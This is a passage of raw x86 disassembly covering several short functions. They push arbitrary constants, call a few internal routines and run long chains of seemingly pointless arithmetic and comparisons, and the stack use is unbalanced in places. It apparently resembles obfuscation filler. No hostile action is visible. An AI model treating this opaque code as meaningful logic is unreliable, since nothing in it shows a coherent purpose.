  41ed54:	push   0xfffffff0
  41ed56:	call   0x41f7ae
  41ed5b:	add    esp,0x14
  41ed5e:	push   0xcc970300
  41ed63:	call   0x41f7ae
  41ed68:	add    esp,0x4
  41ed6b:	mov    ebx,0x29
  41ed70:	call   0x41fb7d
  41ed75:	push   0x75
  41ed77:	push   0xac985500
  41ed7c:	push   ebx
  41ed7d:	push   ebx
  41ed7e:	push   0x1c9ad900
  41ed83:	call   0x41f2ed
  41ed88:	add    esp,0x14
  41ed8b:	push   eax
  41ed8c:	push   0xffffffce
  41ed8e:	call   0x41f7ae
  41ed93:	add    esp,0x8
  41ed96:	push   0x23c3f00
  41ed9b:	push   0xae216a00
  41eda0:	push   ebx
  41eda1:	call   0x41f3d2
  41eda6:	add    esp,0xc
  41eda9:	pop    edi
  41edaa:	mov    edx,0xc8
  41edaf:	push   0x7
  41edb1:	push   0xe23a600
  41edb6:	push   edi
  41edb7:	call   0x41f3d2
  41edbc:	add    esp,0xc
  41edbf:	call   0x41fb7d
  41edc4:	pop    esi
  41edc5:	mov    ebx,esi
  41edc7:	mov    eax,esi
  41edc9:	push   0xdee6af00
  41edce:	push   0xfc93dc00
  41edd3:	push   0xffffff94
  41edd5:	push   0xffffff95
  41edd7:	call   0x41f3d2
  41eddc:	add    esp,0x10
  41eddf:	push   esi
  41ede0:	push   0xfffffff1
  41ede2:	call   0x41f3d2
  41ede7:	add    esp,0x8
  41edea:	mov    DWORD PTR [ebp-0x8],ebx
  41eded:	call   0x41fa1f
  41edf2:	pop    ebx
  41edf3:	cmp    ebx,DWORD PTR [ebp-0x4]
  41edf6:	je     0x41ee09
  41edf8:	push   0x76
  41edfa:	push   0x2e
  41edfc:	push   0xdeea9200
  41ee01:	call   0x41f7ae
  41ee06:	add    esp,0xc
  41ee09:	push   0xa6aedb00
  41ee0e:	push   esi
  41ee0f:	push   0xffffffc4
  41ee11:	push   0x3242b200
  41ee16:	call   0x41f7ae
  41ee1b:	add    esp,0x10
  41ee1e:	leave  
  41ee1f:	ret    
  41ee20:	int3   
  41ee21:	int3   
  41ee22:	int3   
  41ee23:	int3   
  41ee24:	int3   
  41ee25:	push   ebp
  41ee26:	mov    ebp,esp
  41ee28:	sub    esp,0x40
  41ee2b:	push   0xffffffee
  41ee2d:	push   0xfffffff6
  41ee2f:	push   0x60
  41ee31:	push   0x16
  41ee33:	push   0x12
  41ee35:	call   0x41fa1f
  41ee3a:	add    esp,0x14
  41ee3d:	push   ebx
  41ee3e:	push   0x4606a400
  41ee43:	push   0x48
  41ee45:	call   0x41f2ed
  41ee4a:	add    esp,0x8
  41ee4d:	push   eax
  41ee4e:	push   0x6c
  41ee50:	push   eax
  41ee51:	push   eax
  41ee52:	push   eax
  41ee53:	call   0x41f2ed
  41ee58:	add    esp,0x14
  41ee5b:	push   esi
  41ee5c:	mov    DWORD PTR [ebp-0x3c],eax
  41ee5f:	push   edi
  41ee60:	mov    edi,eax
  41ee62:	call   0x41fa1f
  41ee67:	and    DWORD PTR [ebp-0x3c],eax
  41ee6a:	cmp    edi,eax
  41ee6c:	je     0x41ee9d
  41ee6e:	and    edi,eax
  41ee70:	push   0x922e3a00
  41ee75:	push   0xffffffd6
  41ee77:	push   0xffffff80
  41ee79:	push   0xfffffffb
  41ee7b:	push   0xe641c500
  41ee80:	call   0x41fa1f
  41ee85:	add    esp,0x14
  41ee88:	push   edi
  41ee89:	push   0x18
  41ee8b:	push   0xae01c600
  41ee90:	push   0xe69c7000
  41ee95:	call   0x41f2ed
  41ee9a:	add    esp,0x10
  41ee9d:	mov    edx,DWORD PTR [ebp-0x3c]
  41eea0:	push   0xffffff87
  41eea2:	push   0x66cc9100
  41eea7:	push   edx
  41eea8:	push   0xa
  41eeaa:	push   edi
  41eeab:	call   0x41f2ed
  41eeb0:	add    esp,0x14
  41eeb3:	push   0x7eb65700
  41eeb8:	push   0x9
  41eeba:	push   eax
  41eebb:	push   0xffffffbb
  41eebd:	call   0x41fb7d
  41eec2:	add    esp,0x10
  41eec5:	add    eax,eax
  41eec7:	call   0x41fa1f
  41eecc:	push   0x7ea7b100
  41eed1:	push   edi
  41eed2:	push   0xf61d5100
  41eed7:	push   eax
  41eed8:	call   0x41f7ae
  41eedd:	add    esp,0x10
  41eee0:	push   eax
  41eee1:	push   0x923d3700
  41eee6:	push   edi
  41eee7:	push   eax
  41eee8:	push   eax
  41eee9:	call   0x41fb7d
  41eeee:	add    esp,0x14
  41eef1:	sub    DWORD PTR [ebp-0x3c],edi
  41eef4:	xor    DWORD PTR [ebp-0x3c],edi
  41eef7:	push   0x42686300
  41eefc:	push   0x7d
  41eefe:	push   eax
  41eeff:	call   0x41f7ae
  41ef04:	add    esp,0xc
  41ef07:	pop    edi
  41ef08:	push   eax
  41ef09:	push   0x3c
  41ef0b:	call   0x41f2ed
  41ef10:	add    esp,0x8
  41ef13:	push   0x5e
  41ef15:	push   eax
  41ef16:	call   0x41f7ae
  41ef1b:	add    esp,0x8
  41ef1e:	pop    esi
  41ef1f:	add    eax,esi
  41ef21:	push   0xfffffffb
  41ef23:	push   eax
  41ef24:	call   0x41fb7d
  41ef29:	add    esp,0x8
  41ef2c:	pop    ebx
  41ef2d:	call   0x41f3d2
  41ef32:	call   0x41f7ae
  41ef37:	leave  
  41ef38:	ret    
  41ef39:	int3   
  41ef3a:	int3   
  41ef3b:	int3   
  41ef3c:	int3   
  41ef3d:	int3   
  41ef3e:	push   ebp
  41ef3f:	mov    ebp,esp
  41ef41:	sub    esp,0x2c
  41ef44:	xor    eax,eax
  41ef46:	mov    edx,0x11
  41ef4b:	push   0xffffffb2
  41ef4d:	push   0x8652aa00
  41ef52:	push   0x64
  41ef54:	push   edx
  41ef55:	call   0x41f7ae
  41ef5a:	add    esp,0x10
  41ef5d:	push   0x52166400
  41ef62:	push   0x7e
  41ef64:	push   0xffffffd2
  41ef66:	call   0x41fb7d
  41ef6b:	add    esp,0xc
  41ef6e:	push   ebx
  41ef6f:	push   0x67
  41ef71:	push   0xbe1c3a00
  41ef76:	push   eax
  41ef77:	call   0x41fa1f
  41ef7c:	add    esp,0xc
  41ef7f:	push   0xde8d5b00
  41ef84:	push   0x46
  41ef86:	push   0xacdc0400
  41ef8b:	push   0xffffff94
  41ef8d:	push   eax
  41ef8e:	call   0x41fb7d
  41ef93:	add    esp,0x14
  41ef96:	push   esi
  41ef97:	cmp    eax,0x33
  41ef9a:	jne    0x41efb1
  41ef9c:	push   0x7eb82500
  41efa1:	push   eax
  41efa2:	push   eax
  41efa3:	push   0x220c6100
  41efa8:	push   eax
  41efa9:	call   0x41f2ed
  41efae:	add    esp,0x14
  41efb1:	push   0xffffffe7
  41efb3:	call   0x41fa1f
  41efb8:	add    esp,0x4
  41efbb:	push   edi
  41efbc:	mov    ebx,eax
  41efbe:	push   0xb617eb00
  41efc3:	push   0x42
  41efc5:	push   ebx
  41efc6:	push   ebx
  41efc7:	push   ebx
  41efc8:	call   0x41f7ae
  41efcd:	add    esp,0x14
  41efd0:	push   eax
  41efd1:	call   0x41f2ed
  41efd6:	add    esp,0x4
  41efd9:	sub    ebx,eax
  41efdb:	call   0x41fa1f
  41efe0:	call   0x41f2ed
  41efe5:	push   0xce107500
  41efea:	push   eax
  41efeb:	push   0xffffffbb
  41efed:	push   0xffffffeb
  41efef:	call   0x41fb7d
  41eff4:	add    esp,0x10
  41eff7:	call   0x41f2ed
  41effc:	push   eax
  41effd:	call   0x41f7ae
  41f002:	add    esp,0x4
  41f005:	push   0xffffffae
  41f007:	push   0xffffffa3
  41f009:	push   0xfffffffb
  41f00b:	call   0x41fb7d
  41f010:	add    esp,0xc
  41f013:	mov    DWORD PTR [ebp-0x14],ebx
  41f016:	add    ebx,ebx
  41f018:	push   ebx
  41f019:	push   0x7a
  41f01b:	call   0x41fa1f
  41f020:	add    esp,0x8
  41f023:	sub    eax,ebx
  41f025:	push   0x7a428d00
  41f02a:	push   0xffffffb5
  41f02c:	push   0x5e8fb300
  41f031:	push   eax
  41f032:	push   ebx
  41f033:	call   0x41f2ed
  41f038:	add    esp,0x14
  41f03b:	pop    edi
  41f03c:	push   0x8a14d700
  41f041:	push   0xfffffff8
  41f043:	call   0x41fa1f
  41f048:	add    esp,0x8
  41f04b:	push   edi
  41f04c:	push   0xffffffc5
  41f04e:	push   eax
  41f04f:	push   eax
  41f050:	call   0x41f7ae
  41f055:	add    esp,0x10
  41f058:	pop    esi
  41f059:	push   eax
  41f05a:	push   0xac97ff00
  41f05f:	push   ebx
  41f060:	call   0x41f7ae
  41f065:	add    esp,0xc
  41f068:	pop    ebx
  41f069:	call   0x41f3d2
  41f06e:	leave  
  41f06f:	ret    
  41f070:	int3   
  41f071:	int3   
  41f072:	int3   
  41f073:	int3   
  41f074:	int3   
  41f075:	push   ebp
  41f076:	mov    ebp,esp
  41f078:	sub    esp,0x34
  41f07b:	call   0x41f3d2
  41f080:	push   ebx
  41f081:	push   eax
  41f082:	call   0x41fb7d
  41f087:	add    esp,0x4
  41f08a:	push   eax
  41f08b:	push   0xffffffdd
  41f08d:	call   0x41f2ed
  41f092:	add    esp,0x8
  41f095:	push   esi
  41f096:	mov    DWORD PTR [ebp-0x18],eax
  41f099:	push   eax
  41f09a:	push   eax
  41f09b:	push   eax
  41f09c:	push   0x7d
  41f09e:	call   0x41f3d2
  41f0a3:	add    esp,0x10
  41f0a6:	push   edi
  41f0a7:	call   0x41f7ae
  41f0ac:	push   0xffffffda
  41f0ae:	push   eax
  41f0af:	push   0xffffff9a
  41f0b1:	push   0x7a
  41f0b3:	call   0x41f2ed
  41f0b8:	add    esp,0x10
  41f0bb:	mov    esi,DWORD PTR [ebp-0x18]
  41f0be:	mov    ebx,DWORD PTR [ebp-0x18]
  41f0c1:	and    ebx,eax
  41f0c3:	mov    DWORD PTR [ebp-0x18],ebx
  41f0c6:	push   eax
  41f0c7:	push   0xffffff9c
  41f0c9:	push   ebx
  41f0ca:	call   0x41f3d2
  41f0cf:	add    esp,0xc
  41f0d2:	push   0x223aea00
  41f0d7:	call   0x41f2ed
  41f0dc:	add    esp,0x4
  41f0df:	push   esi
  41f0e0:	push   eax
  41f0e1:	push   ebx
  41f0e2:	push   0xcc7b600
  41f0e7:	push   ebx
  41f0e8:	call   0x41fb7d
  41f0ed:	add    esp,0x14
  41f0f0:	push   0x6616e300
  41f0f5:	push   0x6149c00
  41f0fa:	push   esi
  41f0fb:	push   eax
  41f0fc:	call   0x41f3d2
  41f101:	add    esp,0x10
  41f104:	push   esi
  41f105:	push   0x4ce5d200
  41f10a:	push   0xffffffa4
  41f10c:	push   0xa6abc900
  41f111:	push   0x4246da00
  41f116:	call   0x41f2ed
  41f11b:	add    esp,0x14
  41f11e:	push   ebx
  41f11f:	push   0x525d8e00
  41f124:	push   0x4cb8af00
  41f129:	call   0x41fa1f
  41f12e:	add    esp,0xc
  41f131:	push   0xfffffff9
  41f133:	push   0xffffffbc
  41f135:	call   0x41f2ed
  41f13a:	add    esp,0x8
  41f13d:	push   0x727e5b00
  41f142:	push   0xbe0d4d00
  41f147:	push   esi
  41f148:	call   0x41fb7d
  41f14d:	add    esp,0xc
  41f150:	add    DWORD PTR [ebp-0x18],esi
  41f153:	pop    edi
  41f154:	push   0x4f
  41f156:	call   0x41f7ae
  41f15b:	add    esp,0x4
  41f15e:	pop    esi
  41f15f:	sub    ebx,eax
  41f161:	push   0x3cf68100
  41f166:	push   0x665f1600
  41f16b:	push   0x2639b300
  41f170:	call   0x41f3d2
  41f175:	add    esp,0xc
  41f178:	sub    DWORD PTR [ebp-0x18],esi
  41f17b:	xor    DWORD PTR [ebp-0x18],edi
  41f17e:	push   0xffffffe9
  41f180:	push   0x68
  41f182:	push   0x26
  41f184:	call   0x41f7ae
  41f189:	add    esp,0xc
  41f18c:	push   ebx
  41f18d:	push   esi
  41f18e:	push   eax
  41f18f:	push   eax
  41f190:	call   0x41fb7d
  41f195:	add    esp,0x10
  41f198:	pop    ebx
  41f199:	mov    ecx,0x20
  41f19e:	push   0xe25b1300
  41f1a3:	push   eax
  41f1a4:	push   0xda39b900
  41f1a9:	push   0xec9dda00
  41f1ae:	call   0x41fa1f
  41f1b3:	add    esp,0x10
  41f1b6:	push   0xffffffb8
  41f1b8:	call   0x41f2ed
  41f1bd:	add    esp,0x4
  41f1c0:	leave  
  41f1c1:	ret    
  41f1c2:	int3   
  41f1c3:	int3   
  41f1c4:	int3   
  41f1c5:	int3   
  41f1c6:	int3   
  41f1c7:	push   ebp
  41f1c8:	mov    ebp,esp
  41f1ca:	sub    esp,0x44
  41f1cd:	push   0x3c937200
  41f1d2:	push   0xffffff9c
  41f1d4:	call   0x41f7ae
  41f1d9:	add    esp,0x8
  41f1dc:	push   ebx
  41f1dd:	add    eax,eax
  41f1df:	mov    ecx,eax
  41f1e1:	cmp    ecx,DWORD PTR [ebp-0x28]
  41f1e4:	je     0x41f205
  41f1e6:	mov    ebx,0xd0
  41f1eb:	add    ecx,eax
  41f1ed:	push   0x49
  41f1ef:	push   eax
  41f1f0:	push   0x42640700
  41f1f5:	call   0x41fa1f
  41f1fa:	add    esp,0xc
  41f1fd:	mov    DWORD PTR [ebp-0x18],eax
  41f200:	add    ebx,eax
  41f202:	xor    DWORD PTR [ebp-0x18],ebx
  41f205:	push   0x7c
  41f207:	call   0x41f7ae
  41f20c:	add    esp,0x4
  41f20f:	push   esi
  41f210:	push   0xffffffa9
  41f212:	push   0x46590c00
  41f217:	push   eax
  41f218:	call   0x41f3d2
  41f21d:	add    esp,0xc
  41f220:	push   edi
  41f221:	push   0x7efb0d00
  41f226:	push   eax
  41f227:	push   0x16186f00
  41f22c:	push   eax
  41f22d:	push   0xa142a00
  41f232:	call   0x41f3d2
  41f237:	add    esp,0x14
  41f23a:	push   ebx
  41f23b:	push   eax
  41f23c:	push   0xe6b7ca00
  41f241:	push   0x43
  41f243:	push   0x8ce78200
  41f248:	call   0x41f3d2
  41f24d:	add    esp,0x14
  41f250:	mov    DWORD PTR [ebp-0x2c],eax
  41f253:	push   0xbe7e7500
  41f258:	push   eax
  41f259:	push   0x7e9d8000
  41f25e:	call   0x41fa1f
  41f263:	add    esp,0xc
  41f266:	push   0x18
  41f268:	push   0x7e
  41f26a:	push   0x4f
  41f26c:	push   eax
  41f26d:	push   0x26902700
  41f272:	call   0x41f3d2
  41f277:	add    esp,0x14
  41f27a:	mov    eax,DWORD PTR [ebp-0x2c]
  41f27d:	push   ebx
  41f27e:	call   0x41f7ae
  41f283:	add    esp,0x4
  41f286:	push   ebx
  41f287:	push   ebx
  41f288:	push   0xc
  41f28a:	push   0xae515100
  41f28f:	call   0x41f3d2
  41f294:	add    esp,0x10
  41f297:	push   0x2f
  41f299:	push   0x66588100
  41f29e:	push   0xae534900
  41f2a3:	push   0x23
  41f2a5:	call   0x41f3d2
  41f2aa:	add    esp,0x10
  41f2ad:	sub    DWORD PTR [ebp-0x2c],ebx
  41f2b0:	push   eax
  41f2b1:	push   0xffffff97
  41f2b3:	push   0x5efbe900
  41f2b8:	push   0x2c
  41f2ba:	call   0x41f3d2
  41f2bf:	add    esp,0x10
  41f2c2:	pop    edi
  41f2c3:	cmp    eax,0xffffff90
  41f2c6:	jne    0x41f2cd
  41f2c8:	call   0x41fa1f
  41f2cd:	call   0x41f3d2
  41f2d2:	pop    esi
  41f2d3:	push   0xccfb6700
  41f2d8:	call   0x41fa1f
  41f2dd:	add    esp,0x4
  41f2e0:	pop    ebx
  41f2e1:	call   0x41f3d2
  41f2e6:	leave  
  41f2e7:	ret    
  41f2e8:	int3   
  41f2e9:	int3   
  41f2ea:	int3   
  41f2eb:	int3   
  41f2ec:	int3   
  41f2ed:	push   ebp
  41f2ee:	mov    ebp,esp
  41f2f0:	sub    esp,0x20
  41f2f3:	xor    ecx,ecx
  41f2f5:	add    ecx,ecx
  41f2f7:	mov    edx,ecx
  41f2f9:	mov    DWORD PTR [ebp-0x4],edx
  41f2fc:	push   ebx
  41f2fd:	xor    eax,eax
  41f2ff:	mov    ecx,DWORD PTR [ebp-0x4]
  41f302:	sub    eax,edx
  41f304:	sub    DWORD PTR [ebp-0x4],ecx
  41f307:	sub    eax,edx
  41f309:	or     DWORD PTR [ebp-0x4],eax
  41f30c:	push   esi
  41f30d:	mov    esi,DWORD PTR [ebp-0x4]
  41f310:	add    DWORD PTR [ebp-0x4],esi
  41f313:	push   edi
  41f314:	mov    ebx,DWORD PTR ds:0x42b088
  41f31a:	sub    DWORD PTR [ebp-0x4],esi
  41f31d:	sub    DWORD PTR [ebp-0x4],ebx
  41f320:	sub    ecx,esi
  41f322:	or     DWORD PTR [ebp-0x4],ecx
  41f325:	mov    ebx,0xe2
  41f32a:	mov    edi,0xc4
  41f32f:	and    DWORD PTR [ebp-0x4],edi
  41f332:	add    ebx,ebx
  41f334:	sub    edx,ecx
  41f336:	or     DWORD PTR [ebp-0x4],esi
  41f339:	add    DWORD PTR [ebp-0x4],edx
  41f33c:	sub    ebx,ecx
  41f33e:	add    ebx,ebx
  41f340:	sub    ebx,eax
  41f342:	add    ebx,edi
  41f344:	cmp    ebx,DWORD PTR ds:0x42b088
  41f34a:	je     0x41f362
  41f34c:	and    DWORD PTR [ebp-0x4],esi
  41f34f:	mov    edi,DWORD PTR ds:0x42b0d0
  41f355:	mov    eax,DWORD PTR [ebp-0x4]
  41f358:	add    DWORD PTR [ebp-0x4],ebx
  41f35b:	add    edi,edx
  41f35d:	and    edi,eax
  41f35f:	xor    DWORD PTR [ebp-0x4],edi
  41f362:	cmp    esi,0x75
  41f365:	jne    0x41f399
  41f367:	mov    eax,ebx
  41f369:	or     eax,ebx
  41f36b:	mov    esi,DWORD PTR [ebp-0x4]
  41f36e:	cmp    eax,DWORD PTR ds:0x42b088
  41f374:	jne    0x41f399
  41f376:	sub    DWORD PTR [ebp-0x4],esi
  41f379:	mov    edi,DWORD PTR [ebp-0x4]
  41f37c:	sub    eax,ecx
  41f37e:	mov    ebx,0x2c
  41f383:	add    edi,ebx
  41f385:	mov    DWORD PTR [ebp-0x4],edi
  41f388:	cmp    eax,edx
  41f38a:	je     0x41f399
  41f38c:	mov    edx,0x1f
  41f391:	mov    ecx,eax
  41f393:	sub    DWORD PTR [ebp-0x4],ecx
  41f396:	sub    DWORD PTR [ebp-0x4],edx
  41f399:	pop    edi
  41f39a:	cmp    edi,0xffffffb5
  41f39d:	jne    0x41f3c1
  41f39f:	and    eax,esi
  41f3a1:	mov    ecx,0xf7
  41f3a6:	and    DWORD PTR [ebp-0x4],edi
  41f3a9:	mov    esi,DWORD PTR [ebp-0x4]
  41f3ac:	and    eax,ebx
  41f3ae:	and    eax,esi
  41f3b0:	and    ecx,edx
  41f3b2:	sub    DWORD PTR [ebp-0x4],ecx
  41f3b5:	sub    eax,edi
  41f3b7:	cmp    eax,0x48af
  41f3bc:	jne    0x41f3c1
  41f3be:	add    DWORD PTR [ebp-0x4],eax
  41f3c1:	pop    esi
  41f3c2:	sub    DWORD PTR [ebp-0x4],ecx
  41f3c5:	pop    ebx
  41f3c6:	add    eax,ebx
  41f3c8:	add    DWORD PTR [ebp-0x4],eax
  41f3cb:	leave  
  41f3cc:	ret    
  41f3cd:	int3   
  41f3ce:	int3   
  41f3cf:	int3   
  41f3d0:	int3   
  41f3d1:	int3   
  41f3d2:	push   ebp
  41f3d3:	mov    ebp,esp
  41f3d5:	sub    esp,0x28
  41f3d8:	mov    eax,DWORD PTR ds:0x42b078
  41f3de:	mov    DWORD PTR [ebp-0x28],eax
  41f3e1:	push   ebx
  41f3e2:	xor    eax,eax
  41f3e4:	add    eax,eax
  41f3e6:	mov    ebx,DWORD PTR [ebp-0x28]
  41f3e9:	cmp    ebx,DWORD PTR ds:0x42b078
  41f3ef:	je     0x41f40f
  41f3f1:	add    DWORD PTR [ebp-0x28],eax
  41f3f4:	mov    eax,DWORD PTR [ebp-0x28]
  41f3f7:	mov    DWORD PTR [ebp-0x28],ebx
  41f3fa:	mov    ecx,DWORD PTR ds:0x42b070
  41f400:	add    eax,ebx
  41f402:	add    DWORD PTR [ebp-0x28],ecx
  41f405:	sub    eax,ecx
  41f407:	add    eax,ecx
  41f409:	add    DWORD PTR [ebp-0x28],ecx
  41f40c:	add    DWORD PTR [ebp-0x28],eax
  41f40f:	push   esi
  41f410:	mov    ecx,DWORD PTR [ebp-0x28]
  41f413:	mov    ebx,DWORD PTR [ebp-0x28]
  41f416:	cmp    ecx,0xfffffff7
  41f419:	je     0x41f507
  41f41f:	mov    esi,DWORD PTR ds:0x42b07c
  41f425:	cmp    ebx,DWORD PTR ds:0x42b078
  41f42b:	jne    0x41f507
  41f431:	xor    eax,eax
  41f433:	add    ebx,esi
  41f435:	sub    eax,ecx
  41f437:	mov    esi,DWORD PTR ds:0x42b0cc
  41f43d:	cmp    eax,0xffffffe7
  41f440:	je     0x41f507
  41f446:	xor    edx,edx
  41f448:	sub    DWORD PTR [ebp-0x28],ecx
  41f44b:	sub    ebx,esi
  41f44d:	cmp    ebx,DWORD PTR ds:0x42b078
  41f453:	je     0x41f507
  41f459:	and    edx,esi
  41f45b:	mov    ecx,0x86
  41f460:	xor    esi,esi
  41f462:	add    DWORD PTR [ebp-0x28],ecx
  41f465:	add    DWORD PTR [ebp-0x28],edx
  41f468:	xor    DWORD PTR [ebp-0x28],ebx
  41f46b:	cmp    eax,esi
  41f46d:	jne    0x41f507
  41f473:	cmp    eax,ebx
  41f475:	je     0x41f507
  41f47b:	add    DWORD PTR [ebp-0x28],esi
  41f47e:	cmp    eax,0x3f
  41f481:	jne    0x41f507
  41f487:	mov    esi,0xcf10
  41f48c:	mov    edx,DWORD PTR [ebp-0x28]
  41f48f:	cmp    eax,0x6f
  41f492:	je     0x41f507
  41f494:	mov    ecx,DWORD PTR [ebp-0x28]
  41f497:	sub    esi,ecx
  41f499:	cmp    edx,0x1d
  41f49c:	je     0x41f507
  41f49e:	cmp    edx,DWORD PTR [ebp-0x24]
  41f4a1:	je     0x41f507
  41f4a3:	mov    ecx,0xb4
  41f4a8:	sub    DWORD PTR [ebp-0x28],esi
  41f4ab:	mov    ebx,DWORD PTR [ebp-0x28]
  41f4ae:	cmp    ebx,DWORD PTR ds:0x42b070
  41f4b4:	je     0x41f507
  41f4b6:	add    ebx,ebx
  41f4b8:	mov    esi,0x1a
  41f4bd:	add    DWORD PTR [ebp-0x28],eax
  41f4c0:	and    edx,ecx
  41f4c2:	sub    DWORD PTR [ebp-0x28],esi
  41f4c5:	mov    DWORD PTR [ebp-0x28],ebx
  41f4c8:	test   edx,0x19
  41f4ce:	je     0x41f507
  41f4d0:	cmp    edx,eax
  41f4d2:	je     0x41f507
  41f4d4:	cmp    ebx,0xffffffb0
  41f4d7:	jne    0x41f507
  41f4d9:	add    edx,eax
  41f4db:	sub    edx,eax
  41f4dd:	mov    ebx,esi
  41f4df:	mov    ecx,0x42
  41f4e4:	cmp    edx,DWORD PTR [ebp-0x28]
  41f4e7:	jne    0x41f507
  41f4e9:	add    DWORD PTR [ebp-0x28],ebx
  41f4ec:	cmp    edx,DWORD PTR [ebp-0x20]
  41f4ef:	jne    0x41f504
  41f4f1:	and    DWORD PTR [ebp-0x28],esi
  41f4f4:	mov    eax,DWORD PTR [ebp-0x28]
  41f4f7:	mov    ebx,DWORD PTR [ebp-0x28]
  41f4fa:	add    eax,esi
  41f4fc:	and    edx,eax
  41f4fe:	or     DWORD PTR [ebp-0x28],ebx
  41f501:	add    DWORD PTR [ebp-0x28],edx
  41f504:	sub    DWORD PTR [ebp-0x28],ecx
  41f507:	push   edi
  41f508:	test   eax,0x8e99
  41f50d:	je     0x41f536
  41f50f:	mov    edx,DWORD PTR [ebp-0x28]
  41f512:	test   edx,0xa0
  41f518:	je     0x41f536
  41f51a:	cmp    edx,0x63
  41f51d:	je     0x41f536
  41f51f:	add    DWORD PTR [ebp-0x28],ecx
  41f522:	mov    ebx,DWORD PTR [ebp-0x28]
  41f525:	mov    edi,DWORD PTR [ebp-0x28]
  41f528:	and    DWORD PTR [ebp-0x28],edi
  41f52b:	mov    DWORD PTR [ebp-0x10],edx
  41f52e:	add    DWORD PTR [ebp-0x28],ecx
  41f531:	add    ebx,esi
  41f533:	sub    DWORD PTR [ebp-0x28],ebx
  41f536:	xor    edi,edi
  41f538:	sub    DWORD PTR [ebp-0x28],ecx
  41f53b:	mov    ecx,0x9a
  41f540:	sub    ecx,ebx
  41f542:	add    edi,edx
  41f544:	add    edi,ecx
  41f546:	cmp    edi,DWORD PTR ds:0x42b070
  41f54c:	je     0x41f5a0
  41f54e:	xor    ebx,ebx
  41f550:	mov    edx,ecx
  41f552:	and    edi,ecx
  41f554:	or     DWORD PTR [ebp-0x28],edx
  41f557:	sub    edi,ecx
  41f559:	add    DWORD PTR [ebp-0x28],esi
  41f55c:	add    DWORD PTR [ebp-0x28],edi
  41f55f:	add    ebx,eax
  41f561:	add    ebx,edi
  41f563:	cmp    ebx,0x14ab
  41f569:	je     0x41f5a0
  41f56b:	mov    ecx,DWORD PTR [ebp-0x28]
  41f56e:	xor    edi,edi
  41f570:	cmp    ebx,DWORD PTR [ebp-0x28]
  41f573:	jne    0x41f5a0
  41f575:	mov    esi,DWORD PTR [ebp-0x28]
  41f578:	cmp    ebx,0xffffffc6
  41f57b:	jne    0x41f5a0
  41f57d:	mov    eax,DWORD PTR ds:0x42b070
  41f583:	sub    esi,edx
  41f585:	add    edi,eax
  41f587:	test   esi,0x14
  41f58d:	je     0x41f5a0
  41f58f:	add    esi,ebx
  41f591:	xor    DWORD PTR [ebp-0x28],ecx
  41f594:	and    esi,edi
  41f596:	xor    eax,eax
  41f598:	sub    DWORD PTR [ebp-0x28],esi
  41f59b:	sub    eax,edi
  41f59d:	add    DWORD PTR [ebp-0x28],eax
  41f5a0:	cmp    ecx,DWORD PTR [ebp-0x28]
  41f5a3:	je     0x41f711
  41f5a9:	mov    edx,0x33ba
  41f5ae:	mov    esi,DWORD PTR [ebp-0x28]
  41f5b1:	sub    DWORD PTR [ebp-0x28],esi
  41f5b4:	or     edx,ecx
  41f5b6:	sub    edx,esi
  41f5b8:	sub    edx,esi
  41f5ba:	sub    edx,esi
  41f5bc:	cmp    edx,DWORD PTR ds:0x42b070
  41f5c2:	jne    0x41f711
  41f5c8:	cmp    edx,0x14
  41f5cb:	je     0x41f711
  41f5d1:	add    edx,ecx
  41f5d3:	cmp    edx,DWORD PTR [ebp-0x20]
  41f5d6:	jne    0x41f711
  41f5dc:	mov    ecx,ebx
  41f5de:	mov    eax,DWORD PTR [ebp-0x28]
  41f5e1:	cmp    eax,DWORD PTR ds:0x42b0cc
  41f5e7:	jne    0x41f711
  41f5ed:	mov    ebx,DWORD PTR [ebp-0x28]
  41f5f0:	mov    edi,DWORD PTR [ebp-0x28]
  41f5f3:	sub    eax,ebx
  41f5f5:	mov    DWORD PTR [ebp-0x28],ecx
  41f5f8:	cmp    eax,DWORD PTR [ebp-0x8]
  41f5fb:	je     0x41f711
  41f601:	cmp    edx,0x71
  41f604:	je     0x41f711
  41f60a:	cmp    eax,0xfffffff0
  41f60d:	je     0x41f711
  41f613:	mov    esi,DWORD PTR [ebp-0x28]
  41f616:	cmp    esi,DWORD PTR ds:0x42b0cc
  41f61c:	jne    0x41f711
  41f622:	sub    edi,esi
  41f624:	xor    ebx,ebx
  41f626:	mov    ebx,DWORD PTR [ebp-0x28]
  41f629:	cmp    ebx,DWORD PTR ds:0x42b078
  41f62f:	je     0x41f711
  41f635:	sub    DWORD PTR [ebp-0x28],ebx
  41f638:	add    eax,edi
  41f63a:	add    edx,edi
  41f63c:	sub    DWORD PTR [ebp-0x28],edx
  41f63f:	sub    eax,edx
  41f641:	mov    edi,DWORD PTR [ebp-0x28]
  41f644:	add    eax,ecx
  41f646:	add    DWORD PTR [ebp-0x28],edi
  41f649:	cmp    eax,DWORD PTR ds:0x42b070
  41f64f:	jne    0x41f711
  41f655:	mov    edx,0x39
  41f65a:	mov    ebx,edi
  41f65c:	cmp    eax,DWORD PTR ds:0x42b078
  41f662:	je     0x41f711
  41f668:	sub    DWORD PTR [ebp-0x28],ebx
  41f66b:	mov    esi,eax
  41f66d:	mov    eax,0x85
  41f672:	add    edx,eax
  41f674:	sub    edx,ebx
  41f676:	cmp    edx,ebx
  41f678:	jne    0x41f711
  41f67e:	mov    eax,0x4f
  41f683:	sub    eax,ebx
  41f685:	sub    DWORD PTR [ebp-0x28],eax
  41f688:	and    DWORD PTR [ebp-0x28],ecx
  41f68b:	mov    ecx,DWORD PTR [ebp-0x28]
  41f68e:	add    esi,eax
  41f690:	cmp    eax,0x3a5
  41f695:	jne    0x41f711
  41f697:	sub    DWORD PTR [ebp-0x28],ecx
  41f69a:	mov    ecx,DWORD PTR [ebp-0x28]
  41f69d:	cmp    ecx,eax
  41f69f:	je     0x41f711
  41f6a1:	sub    esi,ebx
  41f6a3:	mov    eax,DWORD PTR [ebp-0x28]
  41f6a6:	mov    ebx,edx
  41f6a8:	cmp    ecx,edi
  41f6aa:	jne    0x41f711
  41f6ac:	and    ebx,edi
  41f6ae:	xor    edx,edx
  41f6b0:	sub    DWORD PTR [ebp-0x28],ecx
  41f6b3:	sub    eax,edx
  41f6b5:	or     DWORD PTR [ebp-0x28],eax
  41f6b8:	or     ebx,ecx
  41f6ba:	mov    ecx,DWORD PTR ds:0x42b0cc
  41f6c0:	sub    DWORD PTR [ebp-0x28],ecx
  41f6c3:	and    ebx,eax
  41f6c5:	add    esi,ecx
  41f6c7:	or     ebx,esi
  41f6c9:	cmp    ebx,DWORD PTR [ebp-0x18]
  41f6cc:	je     0x41f711
  41f6ce:	mov    ecx,0x1b
  41f6d3:	mov    esi,DWORD PTR [ebp-0x28]
  41f6d6:	add    ebx,edx
